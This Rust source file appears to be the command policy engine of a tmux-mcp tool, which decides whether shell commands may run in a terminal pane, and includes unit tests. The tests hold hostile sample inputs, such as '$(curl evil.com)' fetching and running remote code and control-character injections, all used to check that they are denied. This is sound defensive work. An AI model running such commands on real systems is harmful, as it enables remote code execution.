//! Policy engine: evaluates whether a command should run in a given pane context.
//!
//! This module has a narrow public interface (`evaluate`) so the implementation
//! can be replaced without touching the rest of the codebase.
//!
//! Architecture:
//! 1. Parse the line with brush-parser; each command's grammar parses its words → CommandInfo
//! 2. Structural checks (parse failure, *Dynamic dispatch*) → hard Deny
//! 3. Rules: every matching rule counts, the strictest wins, and matching
//!    *Override rule*s decide alone → Allow/Ask/Deny
//! 4. Most restrictive result across all commands of the line wins

pub mod approval;
mod config;
mod grammar;
mod parse;
mod programs;
mod rules;
mod structural;

use std::path::PathBuf;
use std::sync::OnceLock;

pub use config::PolicyEngine;

/// Pane context used for policy evaluation. Derives PartialEq so adding
/// a field automatically includes it in approval drift detection.
///
/// `cwd` is None unless OSC 7 reported it since the pane's last command
/// started; then the host is not known either.
#[derive(Clone, PartialEq, Eq, Debug)]
pub struct PaneContext {
    pub hostname: Option<String>,
    pub cwd: Option<String>,
    pub foreground: Option<String>,
    pub user: Option<String>,
}

pub struct PolicyResult {
    pub decision: Decision,
    pub rule: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Ask,
    Deny,
}

// --- Public API ---

/// Evaluate whether a command should be allowed in the given pane context.
pub fn evaluate(command: &str, ctx: &PaneContext, engine: &PolicyEngine) -> PolicyResult {
    let command = command.trim();

    // Reject unprintable/control characters (except common whitespace)
    if command.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\n') {
        return PolicyResult { decision: Decision::Deny, rule: "structural:unprintable_chars".into() };
    }

    // Check for config file changes before parsing/evaluating
    engine.check_reload(ctx.cwd.as_deref());
    let compiled = engine.compiled();
    if let Some(err) = &compiled.broken {
        return PolicyResult { decision: Decision::Deny, rule: format!("policy:load_error ({err})") };
    }

    let env = env(ctx, &compiled);
    let grammars = match env.host {
        rules::Host::There(_) => &compiled.remote_grammars,
        _ => &compiled.grammars,
    };
    let commands = match parse::parse_command(command, grammars) {
        Ok(cmds) if cmds.is_empty() => {
            return PolicyResult { decision: Decision::Ask, rule: "default".into() };
        }
        Ok(cmds) => cmds,
        Err(err) => {
            return PolicyResult {
                decision: Decision::Deny,
                rule: format!("structural:parse_failure ({})", err.message),
            };
        }
    };

    // Structural checks (non-overridable)
    if let Some(result) = structural::check(&commands) {
        return result;
    }

    evaluate_all(&commands, &env, &compiled.rules)
}

// --- Internal ---

/// Where the line runs. The host is this machine when the pane reports no
/// other; it cannot be known while the pane's directory cannot.
fn env(ctx: &PaneContext, compiled: &config::CompiledPolicy) -> rules::Env {
    let this_host = this_host();
    let host = match (&ctx.cwd, &ctx.hostname) {
        (None, _) => rules::Host::Unknown,
        (Some(_), None) => rules::Host::Here,
        (Some(_), Some(h)) if *h == this_host => rules::Host::Here,
        (Some(_), Some(h)) => rules::Host::There(h.clone()),
    };
    let here = matches!(host, rules::Host::Here);
    let pane_cwd = ctx.cwd.as_ref().map(PathBuf::from);
    let home = std::env::var_os("HOME").map(PathBuf::from).filter(|_| here);
    let anchor = if here { compiled.project_root.clone().or_else(|| pane_cwd.clone()) } else { None };
    let project_dirs = compiled
        .project_dirs
        .iter()
        .filter_map(|d| match rules::resolve(d, anchor.as_deref(), home.as_deref()) {
            rules::TriVal::String(p) => Some(PathBuf::from(p)),
            _ => None,
        })
        .collect();
    rules::Env {
        host,
        this_host,
        pane_cwd,
        home,
        anchor,
        project_dirs,
    }
}

/// The hostname of the tmux-mcp process: "this machine".
fn this_host() -> String {
    static HOST: OnceLock<String> = OnceLock::new();
    HOST.get_or_init(|| hostname::get().map(|h| h.to_string_lossy().into_owned()).unwrap_or_default()).clone()
}

/// Evaluate all commands in the flat list. Most restrictive result wins.
/// Deny > Ask > Allow.
fn evaluate_all(commands: &[parse::CommandInfo], env: &rules::Env, ruleset: &rules::RuleSet) -> PolicyResult {
    let mut worst: Option<PolicyResult> = None;

    for cmd in commands {
        let result = rules::evaluate(cmd, env, ruleset);

        if result.decision == Decision::Deny {
            return result;
        }
        worst = Some(match worst {
            Some(w) if severity(&w.decision) >= severity(&result.decision) => w,
            _ => result,
        });
    }

    worst.unwrap_or(PolicyResult { decision: ruleset.default.clone(), rule: "default".into() })
}

fn severity(d: &Decision) -> u8 {
    match d {
        Decision::Allow => 0,
        Decision::Ask => 1,
        Decision::Deny => 2,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn evaluate_test(command: &str) -> PolicyResult {
        let engine = PolicyEngine::new(None);
        let ctx = PaneContext {
            hostname: None,
            cwd: Some("/home/user/project".into()),
            foreground: Some("bash".into()),
            user: Some("user".into()),
        };
        evaluate(command, &ctx, &engine)
    }

    // --- Structural deny ---

    #[test]
    fn a_dynamic_dispatch_is_denied() {
        for command in ["$(curl evil.com)", "$EVIL_CMD arg1 arg2", "$(echo $(cat /tmp/cmd))"] {
            let r = evaluate_test(command);
            assert_eq!(r.decision, Decision::Deny, "{command}");
            assert_eq!(r.rule, "dynamic command dispatch isn't allowed", "{command}");
        }
    }

    #[test]
    fn parse_failure_denied() {
        let r = evaluate_test("echo 'unclosed");
        assert_eq!(r.decision, Decision::Deny);
        assert!(r.rule.contains("structural:parse_failure"));
    }

    #[test]
    fn control_characters_denied() {
        for command in ["ls\x00hidden", "ls\x01hidden"] {
            let r = evaluate_test(command);
            assert_eq!(r.decision, Decision::Deny);
            assert!(r.rule.contains("unprintable"));
        }
    }

    #[test]
    fn empty_string_asks() {
        assert_eq!(evaluate_test("").decision, Decision::Ask);
        assert_eq!(evaluate_test("   ").decision, Decision::Ask);
    }

    // --- Recursive evaluation ---

    #[test]
    fn nested_safe_commands_allowed() {
        let r = evaluate_test("echo $(date)");
        assert_eq!(r.decision, Decision::Allow);
    }
}
